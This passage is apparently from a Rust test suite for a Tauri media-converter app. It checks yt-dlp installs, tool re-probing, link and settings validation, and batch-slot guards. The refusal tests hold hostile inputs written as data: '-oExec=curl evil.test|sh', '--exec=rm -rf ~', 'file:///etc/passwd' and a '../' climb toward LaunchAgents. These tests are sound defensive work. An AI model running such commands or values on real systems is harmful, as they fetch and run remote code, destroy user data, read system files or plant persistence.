    assert_eq!(
        finished["ok"],
        json!(true),
        "a successful fresh install must be reported as one: {message}"
    );
    assert!(message.contains("yt-dlp is installed"), "{message}");

    let _ = std::fs::remove_dir_all(&dir);
}

/// The same fix stated as an ordering, so it cannot be re-broken by a refactor that keeps the
/// shape: the probe factory is called exactly once, and by the time it is called the installer has
/// already exited and every line it wrote has already reached the UI.
///
/// The installer's last act is to write a marker file, so "had it finished?" is a question the
/// factory can answer from inside itself rather than by trusting the code around it.
#[test]
fn the_machine_is_only_scanned_once_the_installer_has_finished() {
    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
    use std::sync::Arc;

    let webview = test_app();
    let app = webview.app_handle().clone();

    let dir = std::env::temp_dir().join(format!("cc-ipc-install-order-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let done = dir.join("installer-exited");
    let program = fake_installer(
        &dir,
        &format!(
            "#!/bin/sh\n\
             echo '==> Fetching yt-dlp'\n\
             echo 'Warning: from stderr' 1>&2\n\
             echo '🍺  yt-dlp: 4 files'\n\
             : > '{marker}'\n\
             exit 0\n",
            marker = done.display()
        ),
    );

    let events: Arc<std::sync::Mutex<Vec<Value>>> = Default::default();
    let sink = events.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            sink.lock().expect("event lock").push(value);
        }
    });

    let scans = Arc::new(AtomicUsize::new(0));
    let installer_had_exited = Arc::new(AtomicBool::new(false));
    let logs_seen_at_scan = Arc::new(AtomicUsize::new(0));

    let id = app.state::<AppState>().begin_install().expect("slot");
    crate::install::run_with(app.clone(), install_command(program), id, {
        let scans = scans.clone();
        let installer_had_exited = installer_had_exited.clone();
        let logs_seen_at_scan = logs_seen_at_scan.clone();
        let seen = events.clone();
        let done = done.clone();
        move || {
            scans.fetch_add(1, Ordering::SeqCst);
            installer_had_exited.store(done.exists(), Ordering::SeqCst);
            let logs = seen
                .lock()
                .expect("event lock")
                .iter()
                .filter(|e| e["type"] == json!("log"))
                .count();
            logs_seen_at_scan.store(logs, Ordering::SeqCst);
            |_: convert_core::Tool| false
        }
    });

    assert_eq!(scans.load(Ordering::SeqCst), 1, "the machine is scanned once per install, no more");
    assert!(
        installer_had_exited.load(Ordering::SeqCst),
        "the machine was scanned while the installer was still running: a fresh install cannot be \
         seen by a scan that happened before it"
    );
    let collected = events.lock().expect("event lock").clone();
    let logs = collected.iter().filter(|e| e["type"] == json!("log")).count();
    assert!(logs >= 3, "the fake installer's output never arrived: {collected:#?}");
    assert_eq!(
        logs_seen_at_scan.load(Ordering::SeqCst),
        logs,
        "the scan happened before the installer's output had all been forwarded, so `stream` had \
         not returned yet"
    );

    let _ = std::fs::remove_dir_all(&dir);
}

/// The reason the whole feature works: `refresh_tools` has to *re-probe the filesystem*, not hand
/// back a list cached at startup. A helper installed while the app is open is the normal case here -
/// that is the click the settings page makes right after a successful install.
#[test]
fn refresh_tools_finds_a_helper_that_appeared_while_the_app_was_running() {
    let webview = test_app();

    let before = invoke(&webview, "refresh_tools", json!({})).expect("refresh_tools");
    let ruffle = before
        .as_array()
        .and_then(|t| t.iter().find(|t| t["id"] == json!("ruffle")))
        .expect("ruffle status")
        .clone();
    if ruffle["available"] == json!(true) {
        // Vanishingly rare (a Ruffle install in /Applications or /opt/homebrew), and the real copy
        // would legitimately win over the stand-in below. Nothing to prove on this machine.
        eprintln!("skipped: this machine already has Ruffle at {}", ruffle["path"]);
        return;
    }

    // Install it, the way a package manager would: a new executable in a directory on `PATH`.
    let dir = std::env::temp_dir().join(format!("cc-ipc-appeared-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    let binary = dir.join("ruffle");
    std::fs::write(&binary, "#!/bin/sh\nexit 0\n").expect("write");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    }
    let path = std::env::var_os("PATH").unwrap_or_default();
    let mut dirs: Vec<std::path::PathBuf> = std::env::split_paths(&path).collect();
    dirs.push(dir.clone());
    std::env::set_var("PATH", std::env::join_paths(&dirs).expect("join PATH"));

    let after = invoke(&webview, "refresh_tools", json!({})).expect("refresh_tools");
    let ruffle = after
        .as_array()
        .and_then(|t| t.iter().find(|t| t["id"] == json!("ruffle")))
        .expect("ruffle status");
    assert_eq!(
        ruffle["available"],
        json!(true),
        "refresh_tools did not re-probe the filesystem: {after}"
    );
    assert_eq!(ruffle["path"], json!(binary.to_string_lossy()));

    // The engine the *converter* uses must see it too, not just the returned list.
    assert!(webview.state::<AppState>().engine().tools.has(convert_core::Tool::Ruffle));

    std::env::set_var("PATH", path);
    let _ = std::fs::remove_dir_all(&dir);
}

/// The other half of Re-check, and the half that was replaying a snapshot: the *sidecars*.
///
/// `refresh_tools` used to rebuild the registry from the `Sidecars` struct captured at startup, so
/// the one helper the user cannot install with a button - the bundled FFmpeg, missing because the
/// copy lost its executable bit or the dev tree never fetched it - was reported missing forever,
/// however many times they fixed it and pressed the button. Only a restart cleared it.
#[test]
fn re_check_hunts_for_the_sidecars_again_instead_of_replaying_the_startup_snapshot() {
    let webview = test_app();
    let state = webview.state::<AppState>();

    let dir = std::env::temp_dir().join(format!("cc-ipc-sidecar-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    for name in ["ffmpeg", "ffprobe"] {
        let path = dir.join(name);
        std::fs::write(&path, "#!/bin/sh\nexit 0\n").expect("write");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        }
    }

    // The hunt that happens *when the button is pressed* is the one whose answer must be used - not
    // whatever `AppState::new` found while the app was starting.
    let appeared = crate::sidecar::Sidecars {
        dir: Some(dir.clone()),
        ffmpeg: Some(dir.join("ffmpeg")),
        ffprobe: Some(dir.join("ffprobe")),
    };
    let statuses = state.refresh_tools_with(|| appeared);

    let ffmpeg = statuses.iter().find(|s| s.id == "ffmpeg").expect("an ffmpeg row");
    assert_eq!(
        ffmpeg.path.as_deref(),
        Some(dir.join("ffmpeg").as_path()),
        "Re-check answered with the startup snapshot: {statuses:#?}"
    );
    // And the engine the converter uses, not just the list handed back to the settings page.
    assert_eq!(
        state.engine().tools.path(convert_core::Tool::Ffprobe),
        Some(dir.join("ffprobe").as_path())
    );

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn inspect_files_and_estimate_output_path_describe_a_real_folder() {
    let webview = test_app();
    let dir = std::env::temp_dir().join(format!("cc-ipc-files-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join("sub")).expect("mkdir");
    std::fs::write(dir.join("clip.mov"), b"x").expect("write");
    std::fs::write(dir.join(".DS_Store"), b"x").expect("write");
    std::fs::write(dir.join("sub/notes.docx"), b"x").expect("write");
    std::fs::write(dir.join("sub/archive.zip"), b"x").expect("write");

    let inspection = invoke(&webview, "inspect_files", json!({ "paths": [dir.to_string_lossy()] }))
        .expect("inspect_files");
    // The payload is an `Inspection`, not a bare list: the frontend reads `files`, and `truncated` +
    // `limit` are what let it say "only the first N of this folder were added".
    let rows = inspection["files"].as_array().cloned().unwrap_or_default();
    assert_eq!(rows.len(), 3, "dotfiles must be skipped: {inspection:#?}");
    assert_eq!(inspection["truncated"], json!(false), "{inspection}");
    assert_eq!(inspection["limit"], json!(5000), "the UI names this number in its banner");

    let clip = rows.iter().find(|r| r["name"] == json!("clip.mov")).expect("clip row");
    assert_eq!(clip["category"], json!("video"));
    assert_eq!(clip["default_target"], json!("mp4"));
    assert_eq!(clip["supported"], json!(true));
    assert!(clip["suggested_targets"].as_array().map(|t| t.len()).unwrap_or(0) >= 3);
    assert!(clip["id"].as_str().map(|s| !s.is_empty()).unwrap_or(false));

    let zip = rows.iter().find(|r| r["name"] == json!("archive.zip")).expect("zip row");
    assert_eq!(zip["supported"], json!(false));
    assert_eq!(zip["note"], json!("Unsupported file type: .zip"));

    // 11. destination preview, with the camelCase spelling of `target_id`
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    let destination = invoke(
        &webview,
        "estimate_output_path",
        json!({ "path": dir.join("clip.mov").to_string_lossy(), "targetId": "mp4", "settings": settings }),
    )
    .expect("estimate_output_path");
    assert_eq!(
        destination.as_str().unwrap_or_default(),
        dir.join("Converted/clip.mp4").to_string_lossy()
    );

    assert!(invoke(
        &webview,
        "estimate_output_path",
        json!({ "path": "/tmp/x.mov", "target_id": "not_a_format", "settings": Value::Null }),
    )
    .is_err());

    let _ = std::fs::remove_dir_all(&dir);
}

/// The link half of the IPC contract, which a separate UI is built against: what `inspect_links`
/// accepts and refuses, what `get_link_support` promises, and the two rules the UI must mirror -
/// the cap and the destination.
#[test]
fn local_batches_do_not_require_a_usable_link_sign_in() {
    let webview = test_app();
    let result = invoke(
        &webview,
        "start_batch",
        json!({
            "items": [{"id":"local-only", "path":"/nonexistent-local-test.png", "target_id":"jpg"}],
            "settings": {"link":{"cookies":"file","cookie_file":""}}
        }),
    );
    assert!(result.is_ok(), "unused cookies must not block a local batch: {result:?}");
    for _ in 0..200 {
        if !webview.state::<AppState>().is_running() {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
    panic!("local batch failed to release its slot");
}

#[test]
fn music_links_have_audio_targets_and_reject_spotify_and_collections() {
    let webview = test_app();
    let result = invoke(
        &webview,
        "inspect_links",
        json!({"links": [
            "https://y.qq.com/n/ryqq/songDetail/abc123",
            "https://music.163.com/#/song?id=123",
            "https://soundcloud.com/artist/track",
            "https://artist.bandcamp.com/track/song",
            "https://open.spotify.com/track/abc",
            "https://artist.bandcamp.com/album/release"
        ]}),
    )
    .unwrap();
    assert_eq!(result["accepted"], 4);
    for row in &result["links"].as_array().unwrap()[..4] {
        assert_eq!(row["category"], "audio");
        assert_eq!(row["default_target"], "mp3");
        assert!(row["suggested_targets"].as_array().unwrap().contains(&json!("flac")));
    }
    assert_eq!(result["links"][4]["supported"], false);
    assert_eq!(result["links"][5]["supported"], false);
    assert!(invoke(
        &webview,
        "test_cookie_source",
        json!({
            "settings": {}, "url": "https://evil.test/track"
        })
    )
    .is_err());
}

#[test]
fn the_link_surface_validates_a_paste_and_states_its_rules() {
    let webview = test_app();

    let inspection = invoke(
        &webview,
        "inspect_links",
        json!({ "links": [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "  https://b23.tv/abcd123  ",
            "https://www.youtube.com/playlist?list=PL0000",
            "https://youtube.com.evil.test/watch?v=a",
            "-oExec=curl evil.test|sh",
            "",
        ] }),
    )
    .expect("inspect_links");

    let rows = inspection["links"].as_array().cloned().unwrap_or_default();
    assert_eq!(rows.len(), 5, "empty lines are dropped, everything else is a row: {inspection:#?}");
    assert_eq!(inspection["accepted"], json!(2), "{inspection:#?}");
    assert_eq!(inspection["limit"], json!(20), "the UI names this number");

    assert_eq!(rows[0]["supported"], json!(true));
    assert_eq!(rows[0]["site"], json!("youtube"));
    assert_eq!(rows[0]["site_label"], json!("YouTube"));
    assert_eq!(rows[0]["default_target"], json!("mp4"));
    assert!(rows[0]["suggested_targets"].as_array().map(|t| t.len()).unwrap_or(0) >= 3);
    assert_eq!(rows[0]["note"], Value::Null);
    // Trimmed, and passed back exactly as the core will use it.
    assert_eq!(rows[1]["url"], json!("https://b23.tv/abcd123"));
    assert_eq!(rows[1]["site"], json!("bilibili"));

    for (row, expected) in [(&rows[2], "playlist"), (&rows[3], "youtube.com.evil.test")] {
        assert_eq!(row["supported"], json!(false), "{row}");
        let note = row["note"].as_str().unwrap_or_default();
        assert!(note.contains(expected), "{note}");
    }
    // A crafted, flag-shaped line is a refusal with a readable echo - never an argument.
    assert_eq!(rows[4]["supported"], json!(false));
    assert!(rows[4]["site"].is_null());

    // Over the cap the whole paste is refused, and the message names the count it got.
    let many: Vec<String> = (0..21).map(|i| format!("https://youtu.be/video{i:03}")).collect();
    let err = invoke(&webview, "inspect_links", json!({ "links": many }))
        .expect_err("21 links must be refused");
    let err = err.as_str().unwrap_or_default().to_string();
    assert!(err.contains("21") && err.contains("20 at a time"), "{err}");

    // The rules the UI has to state, read from the core rather than restated in TypeScript.
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    let support = invoke(&webview, "get_link_support", json!({ "settings": settings.clone() }))
        .expect("get_link_support");
    assert_eq!(support["max_links"], json!(20));
    assert_eq!(support["package_id"], json!("yt-dlp"));
    assert!(support["tool_installed"].is_boolean());
    let hosts: Vec<String> = support["accepted_hosts"]
        .as_array()
        .expect("accepted_hosts")
        .iter()
        .filter_map(|h| h.as_str().map(str::to_string))
        .collect();
    for host in ["youtube.com", "www.youtube.com", "youtu.be", "www.bilibili.com", "b23.tv"] {
        assert!(hosts.contains(&host.to_string()), "{host} missing from {hosts:?}");
    }
    // Nothing pointed at: ~/Downloads. A chosen folder: that folder, whatever the file rule says.
    let destination = support["destination"].as_str().unwrap_or_default();
    assert!(destination.ends_with("Downloads"), "{destination}");
    let dir = std::env::temp_dir().join(format!("cc-ipc-links-{}", std::process::id()));
    std::fs::create_dir_all(&dir).expect("mkdir");
    let mut chosen = settings.clone();
    chosen["output"]["custom_dir"] = json!(dir.to_string_lossy());
    chosen["output"]["location"] = json!("same_folder");
    let support = invoke(&webview, "get_link_support", json!({ "settings": chosen }))
        .expect("get_link_support");
    assert_eq!(support["destination"], json!(dir.to_string_lossy()));
    let _ = std::fs::remove_dir_all(&dir);
}

/// A crafted link must be refused by the shell, before it reaches the queue - and the cap must be
/// enforced on what `start_batch` is handed, not only on what the paste box saw.
#[test]
fn start_batch_refuses_a_link_payload_the_ui_could_not_have_produced() {
    let webview = test_app();
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    let start = |items: Value| {
        invoke(&webview, "start_batch", json!({ "items": items, "settings": settings.clone() }))
    };

    for hostile in [
        "https://evil.test/watch?v=a",
        "file:///etc/passwd",
        "--exec=rm -rf ~",
        "https://www.youtube.com/channel/UC123",
    ] {
        let refused = start(json!([{ "id": "1", "url": hostile, "target_id": "mp3" }]));
        assert!(refused.is_err(), "`{hostile}` must never reach the queue");
    }
    // A row must be one thing or the other.
    assert!(start(json!([{ "id": "1", "target_id": "mp3" }])).is_err());
    assert!(start(json!([
        { "id": "1", "path": "/tmp/clip.mov", "url": "https://youtu.be/abc", "target_id": "mp3" }
    ]))
    .is_err());

    // Twenty-one links, straight to `start_batch`: refused here, with the count in the message.
    let items: Vec<Value> = (0..21)
        .map(|i| json!({ "id": format!("{i}"), "url": format!("https://youtu.be/v{i:03}"), "target_id": "mp3" }))
        .collect();
    let err = start(Value::Array(items)).expect_err("the cap is the core's, not the UI's");
    let err = err.as_str().unwrap_or_default().to_string();
    assert!(err.contains("21"), "{err}");
    // None of these refusals may have latched the single-batch guard.
    assert!(!webview.state::<AppState>().is_running(), "a refusal must not claim the slot");
}

/// Dropping a folder is one gesture, and it used to be unbounded: `inspect_files` walked whatever it
/// was handed, probed every media file it found and handed the webview a row per file - so a home
/// folder meant minutes of dead window. The cap is enforced here, and reported, because a list that
/// silently stops at 5000 files is indistinguishable from a folder that holds 5000 files.
#[test]
fn a_drop_larger_than_the_cap_comes_back_capped_and_flagged() {
    let webview = test_app();
    let dir = std::env::temp_dir().join(format!("cc-ipc-cap-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join("more")).expect("mkdir");
    // Deliberately not media: this test is about enumeration, and nothing here should be probed.
    for n in 0..5_010u32 {
        let leaf = if n < 4_000 { dir.clone() } else { dir.join("more") };
        std::fs::write(leaf.join(format!("note-{n:05}.txt")), b"x").expect("write");
    }

    let inspection = invoke(&webview, "inspect_files", json!({ "paths": [dir.to_string_lossy()] }))
        .expect("inspect_files");
    let rows = inspection["files"].as_array().cloned().unwrap_or_default();
    assert_eq!(rows.len(), 5_000, "the queue is capped: {}", inspection["files"].to_string().len());
    assert_eq!(inspection["truncated"], json!(true), "the UI has to be able to say so");
    assert_eq!(inspection["limit"], json!(5000));

    let _ = std::fs::remove_dir_all(&dir);
}

/// A destination the user has not finished choosing must not take an unrelated edit down with it.
///
/// The bug: `save_settings` validated the whole `Settings` object, so "Custom folder" with no folder
/// picked yet refused the entire payload - and a codec changed in the same drawer, in the same save,
/// was silently lost. Per-field now. What must *not* change is the boundary: an unfinished
/// destination is still something nothing may be written through, and a hostile one is still
/// repaired and still reported.
#[test]
fn a_codec_edit_survives_a_destination_the_user_has_not_finished_choosing() {
    let webview = test_app();
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");

    let mut half_chosen = settings.clone();
    half_chosen["video"]["codec"] = json!("av1");
    half_chosen["output"]["location"] = json!("custom");
    half_chosen["output"]["custom_dir"] = Value::Null;

    let saved = invoke(&webview, "save_settings", json!({ "settings": half_chosen.clone() }))
        .expect("an unfinished destination is not a reason to refuse the whole object");
    assert_eq!(saved["video"]["codec"], json!("av1"), "the codec edit was dropped: {saved}");
    assert_eq!(saved["output"]["location"], json!("subfolder"), "the place is held, not adopted");
    assert_eq!(saved["output"]["subfolder_name"], json!("Converted"));

    let reloaded = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(
        reloaded["video"]["codec"],
        json!("av1"),
        "the edit must be persisted, not just echoed"
    );

    // ...and nothing may be written through the half-made destination in the meantime.
    assert!(
        invoke(
            &webview,
            "estimate_output_path",
            json!({ "path": "/tmp/clip.mov", "target_id": "mp4", "settings": half_chosen }),
        )
        .is_err(),
        "a destination with no folder chosen cannot promise where a file will land"
    );
    assert!(
        invoke(
            &webview,
            "start_batch",
            json!({
                "items": [{ "id": "row-1", "path": "/tmp/clip.mov", "target_id": "mp4" }],
                "settings": half_chosen,
            }),
        )
        .is_err(),
        "a batch cannot run without a destination"
    );
    assert!(!webview.state::<AppState>().is_running(), "a refusal claimed the batch slot");

    // The hostile half of the line: a climbing destination is refused *and* reported, while the
    // unrelated edit that travelled with it is still saved.
    let mut crafted = reloaded.clone();
    crafted["audio"]["bitrate_kbps"] = json!(320);
    crafted["output"]["subfolder_name"] = json!("../../../../Library/LaunchAgents");
    let err = invoke(&webview, "save_settings", json!({ "settings": crafted }))
        .expect_err("a climbing destination must never be persisted silently");
    assert!(err.as_str().unwrap_or_default().contains("stay inside"), "{err}");

    let after = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(after["audio"]["bitrate_kbps"], json!(320), "a valid field is still saved: {after}");
    assert_eq!(after["output"]["subfolder_name"], json!("Converted"), "the climb was repaired");
    assert_eq!(after["output"]["location"], json!("subfolder"));
}

/// A preset is a statement about quality, not about which ten seconds of the clip the user wants.
///
/// `Preset::settings()` deliberately returns a whole fresh `Settings` (that is what makes a preset a
/// preset), so the shell has to carry the trim across by hand. Without that, ticking "cut to 10s"
/// and then clicking a preset - the two most obvious clicks in the window, in the obvious order -
/// silently converted every file in full.
#[test]
fn a_preset_click_keeps_the_trim_the_user_set_up() {
    let webview = test_app();

    let mut with_trim = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    with_trim["trim"] = json!({ "enabled": true, "start_secs": 30.0, "length_secs": 10.0 });
    let saved = invoke(&webview, "save_settings", json!({ "settings": with_trim }))
        .expect("a plain trim is savable");
    assert_eq!(saved["trim"], json!({ "enabled": true, "start_secs": 30.0, "length_secs": 10.0 }));

    let smallest =
        invoke(&webview, "apply_preset", json!({ "preset_id": "smallest" })).expect("apply_preset");
    assert_eq!(smallest["video"]["max_height"], json!(720), "the preset must still take effect");
    assert_eq!(
        smallest["trim"],
        json!({ "enabled": true, "start_secs": 30.0, "length_secs": 10.0 }),
        "the preset discarded the trim: {smallest}"
    );

    let reloaded = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(
        reloaded["trim"]["length_secs"],
        json!(10.0),
        "the carried trim must be persisted, not just echoed"
    );
}

/// The cookie source, from the webview's side of the wall: saved, carried across a preset click, and
/// held back rather than obeyed when it is not something yt-dlp could be pointed at.
///
/// The same three answers the trim and the destination get, on the one field where getting them
/// wrong is a credential problem rather than a preference problem - a settings page that says it is
/// borrowing a sign-in while every fetch runs without one is the dead end this whole feature exists
/// to close.
#[test]
fn a_cookie_source_is_saved_carried_across_a_preset_and_never_half_stored() {
    let webview = test_app();

    // Nothing of the user's is read until they say so: the default is off, in the shape the drawer
    // binds to.
    let start = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(
        start["link"],
        json!({ "cookies": "none", "cookie_browser": "", "cookie_file": null })
    );

    let mut chosen = start.clone();
    chosen["link"] = json!({ "cookies": "browser", "cookie_browser": "firefox" });
    let saved = invoke(&webview, "save_settings", json!({ "settings": chosen }))
        .expect("a browser on the allowlist is savable");
    assert_eq!(saved["link"]["cookies"], json!("browser"));
    assert_eq!(saved["link"]["cookie_browser"], json!("firefox"));

    // A preset is a quality choice and has no opinion about whose sign-in to borrow, so it must not
    // throw one away on its way past.
    let smallest =
        invoke(&webview, "apply_preset", json!({ "preset_id": "smallest" })).expect("apply_preset");
    assert_eq!(smallest["video"]["max_height"], json!(720), "the preset must still take effect");
    assert_eq!(smallest["link"]["cookie_browser"], json!("firefox"), "{smallest}");
    let reloaded = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(reloaded["link"]["cookie_browser"], json!("firefox"), "and it was persisted");

    // The user switches to "from a file" and changes a codec before choosing one. Nothing to
    // report; the source stands still while the unrelated edit goes through.
    let mut mid_typing = reloaded.clone();
    mid_typing["link"] = json!({ "cookies": "file", "cookie_file": "" });
    mid_typing["audio"]["codec"] = json!("flac");
    let held = invoke(&webview, "save_settings", json!({ "settings": mid_typing }))
        .expect("a path mid-edit is not a reason to refuse the object");
    assert_eq!(held["audio"]["codec"], json!("flac"), "the codec edit was dropped: {held}");
    assert_eq!(held["link"]["cookie_browser"], json!("firefox"), "the source is held: {held}");

    // ...but nothing fetches through it, because the fetch would carry no cookie flag at all while
    // the drawer said it was borrowing a sign-in.
    let mut unfinished = held.clone();
    unfinished["link"] = json!({ "cookies": "file", "cookie_file": "" });
    let err = invoke(
        &webview,
        "start_batch",
        json!({
            "items": [{ "id": "row-1", "url": "https://youtu.be/dQw4w9WgXcQ", "target_id": "mp4" }],
            "settings": unfinished,
        }),
    )
    .expect_err("a batch cannot run behind a cookie source with no file");
    assert!(err.as_str().unwrap_or_default().contains("cookies.txt"), "{err}");
    assert!(!webview.state::<AppState>().is_running(), "a refusal claimed the batch slot");

    // A browser we will not put on a command line: held the same way, and said out loud, because
    // the settings page keeps showing what the user chose.
    let mut crafted = held.clone();
    crafted["image"]["quality"] = json!(73);
    crafted["link"] = json!({ "cookies": "browser", "cookie_browser": "chrome:Profile 2" });
    let err = invoke(&webview, "save_settings", json!({ "settings": crafted }))
        .expect_err("an unusable browser must never be persisted silently");
    assert!(err.as_str().unwrap_or_default().contains("Choose one of"), "{err}");

    let after = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(after["image"]["quality"], json!(73), "a valid field is still saved: {after}");
    assert_eq!(after["link"]["cookie_browser"], json!("firefox"), "the refused name was held");
}

/// The trim is two numbers out of two text boxes, so it gets the destination's discipline: a length
/// the user has not finished typing is held quietly, a number we would never write comes back with a
/// reason - and in both cases the codec they changed in the same drawer is still saved.
#[test]
fn a_half_typed_trim_holds_the_trim_and_still_saves_the_rest_of_the_sheet() {
    let webview = test_app();

    let mut usable = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    usable["trim"] = json!({ "enabled": true, "start_secs": 5.0, "length_secs": 10.0 });
    invoke(&webview, "save_settings", json!({ "settings": usable.clone() }))
        .expect("a plain trim is savable");

    // The box has been cleared and nothing typed into it yet. Nothing to report; the trim stands
    // still while the unrelated edit goes through.
    let mut clearing = usable.clone();
    clearing["trim"]["length_secs"] = json!(0.0);
    clearing["audio"]["codec"] = json!("flac");
    let held = invoke(&webview, "save_settings", json!({ "settings": clearing }))
        .expect("a length mid-edit is not a reason to refuse the object");
    assert_eq!(held["audio"]["codec"], json!("flac"), "the codec edit was dropped: {held}");
    assert_eq!(held["trim"]["length_secs"], json!(10.0), "the trim is held, not adopted");

    // ...but nothing converts through it: with no length the planner would add no `-t` at all and
    // the batch would quietly convert every file in full.
    let mut unfinished = held.clone();
    unfinished["trim"]["length_secs"] = json!(0.0);
    let err = invoke(
        &webview,
        "start_batch",
        json!({
            "items": [{ "id": "row-1", "path": "/tmp/clip.mov", "target_id": "mp4" }],
            "settings": unfinished,
        }),
    )
    .expect_err("a batch cannot run behind a trim with no length");
    assert!(err.as_str().unwrap_or_default().contains("how many seconds"), "{err}");
    assert!(!webview.state::<AppState>().is_running(), "a refusal claimed the batch slot");

    // A number that really was sent: held the same way, and said out loud, because the settings page
    // keeps showing what the user typed.
    let mut negative = held.clone();
    negative["image"]["quality"] = json!(73);
    negative["trim"]["start_secs"] = json!(-30.0);
    let err = invoke(&webview, "save_settings", json!({ "settings": negative }))
        .expect_err("a negative start must never be persisted silently");
    assert!(err.as_str().unwrap_or_default().contains("cannot be negative"), "{err}");

    let after = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(after["image"]["quality"], json!(73), "a valid field is still saved: {after}");
    assert_eq!(after["trim"]["start_secs"], json!(5.0), "the refused number was held");
    assert_eq!(after["trim"]["length_secs"], json!(10.0));

    let mut week_long = after.clone();
    week_long["trim"]["length_secs"] = json!(7.0 * 24.0 * 60.0 * 60.0);
    let err = invoke(&webview, "save_settings", json!({ "settings": week_long }))
        .expect_err("a week-long trim is not a trim");
    assert!(err.as_str().unwrap_or_default().contains("24 hours"), "{err}");
    let after = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(after["trim"]["length_secs"], json!(10.0), "the refused length was held");
}

#[test]
fn the_single_batch_guard_rejects_a_second_run() {
    let app = configure(mock_builder())
        .build(crate::app_context())
        .expect("failed to build the mock app");
    let state = app.state::<AppState>();

    let first = state.begin_batch().expect("first batch may start");
    assert!(state.begin_batch().is_err(), "a second batch must be refused");

    // Cancelling flips the flag the running batch polls, and freeing the slot re-opens the door.
    state.cancel();
    assert!(first.cancel.load(std::sync::atomic::Ordering::SeqCst));
    state.end_batch(first.id);

    let second = state.begin_batch().expect("a new batch may start once the previous ended");
    assert!(
        !second.cancel.load(std::sync::atomic::Ordering::SeqCst),
        "a fresh flag starts uncancelled"
    );
    assert_ne!(first.id, second.id, "each batch needs its own id to release its own slot");
}

/// The bug this pins: a batch frees the slot twice - once when its `batch_finished` event goes out
/// (so the UI may queue immediately) and once from the worker thread's `Drop` guard. That second
/// release can land *after* the next batch has claimed the slot. With a plain boolean it would free
/// the successor's slot, letting a third batch run concurrently and interleave events for rows the
/// frontend has already retired.
#[test]
fn a_late_release_from_a_finished_batch_cannot_free_its_successors_slot() {
    let app = configure(mock_builder())
        .build(crate::app_context())
        .expect("failed to build the mock app");
    let state = app.state::<AppState>();

    // Batch A runs and releases the slot as its final event is emitted.
    let a = state.begin_batch().expect("first batch may start");
    state.end_batch(a.id);

    // The user clicks Convert the instant that event lands: batch B claims the slot.
    let b = state.begin_batch().expect("the next batch may start");
    assert!(state.is_running(), "batch B owns the slot");

    // Only now does A's worker thread unwind and run its backstop release.
    state.end_batch(a.id);

    assert!(state.is_running(), "A's late release must not free B's slot");
    assert!(state.begin_batch().is_err(), "no batch may run alongside B");

    // B's own release still works.
    state.end_batch(b.id);
    assert!(!state.is_running(), "the owner can always release");
}

/// Load-bearing ordering, half one: `commands.rs` frees the batch slot **before** it emits
/// `batch_finished`. Swap those two statements and this test fails.
///
/// Two dependants. The Convert button is re-enabled by that event, so a click landing with it must
/// not be told "a conversion is already running". And a webview reloaded mid-batch adopts the running
/// batch from `get_activity` and then confirms the adoption by reading `get_activity` *again* after
/// the terminal event (`adoptShellWork`, `src/state/store.ts`): a slot still held at the moment the
/// event goes out reads back as "still converting", so the adopted batch never clears and its Stop
/// button clears nothing for the rest of the session.
///
/// The slot is therefore sampled *inside* the event delivery, which is what a swap can fail:
/// asserting afterwards passes either way, because the worker thread's `Drop` guard frees the slot a
/// moment later regardless of the order.
#[test]
fn the_batch_slot_is_free_at_the_instant_batch_finished_is_emitted() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let webview = test_app();
    let app = webview.app_handle().clone();

    let free_on_finish = Arc::new(AtomicBool::new(false));
    let saw_finish = Arc::new(AtomicBool::new(false));
    let probe_free = free_on_finish.clone();
    let probe_saw = saw_finish.clone();
    let probed = app.clone();
    app.listen(crate::BATCH_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            if value["type"] == json!("batch_finished") {
                probe_free.store(!probed.state::<AppState>().is_running(), Ordering::SeqCst);
                probe_saw.store(true, Ordering::SeqCst);
            }
        }
    });

    // A batch that needs no converter: the one row points at a file that is not there, so it fails
    // immediately - and a failed batch still ends with exactly one `batch_finished`.
    let dir = std::env::temp_dir().join(format!("cc-ipc-order-batch-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    let settings = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    invoke(
        &webview,
        "start_batch",
        json!({
            "items": [{
                "id": "row-1",
                "path": dir.join("ghost.mov").to_string_lossy(),
                "target_id": "mp4",
            }],
            "settings": settings,
        }),
    )
    .expect("start_batch");

    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    while !saw_finish.load(Ordering::SeqCst) && std::time::Instant::now() < deadline {
